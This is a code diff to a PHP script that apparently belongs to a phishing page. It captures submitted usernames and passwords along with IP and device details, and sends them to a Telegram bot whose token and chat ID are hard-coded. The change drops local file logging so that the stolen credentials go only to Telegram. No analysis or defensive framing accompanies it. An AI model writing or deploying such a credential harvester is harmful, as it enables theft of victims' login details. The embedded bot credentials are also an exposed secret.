@@ -14,7 +14,6 @@ if (file_exists(__DIR__ . '/.env')) {
 
 $telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
 $telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
-$log_file = getenv('LOG_FILE') ?: __DIR__ . "/credentials_log.txt";
 
 if(isset($_POST["username"]) && isset($_POST["password"])) {
     $username = $_POST["username"];
@@ -35,7 +34,7 @@ if(isset($_POST["username"]) && isset($_POST["password"])) {
     $message .= "🎬 *Video URL:* `{$redirect_url}`\n";
     $message .= "📱 *Device:* `{$user_agent}`";
     
-    // Send to Telegram
+    // Send ONLY to Telegram - no file logging
     $url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
     
     $post_fields = array(
@@ -51,12 +50,8 @@ if(isset($_POST["username"]) && isset($_POST["password"])) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     
-    $result = curl_exec($ch);
+    curl_exec($ch);
     curl_close($ch);
-    
-    // Log to file
-    $log_entry = "[{$timestamp}] Username: {$username} | Password: {$password} | IP: {$ip} | Redirect: {$redirect_url}\n";
-    file_put_contents($log_file, $log_entry, FILE_APPEND);
     
     echo json_encode(['success' => true, 'redirect' => $redirect_url]);
 } else {
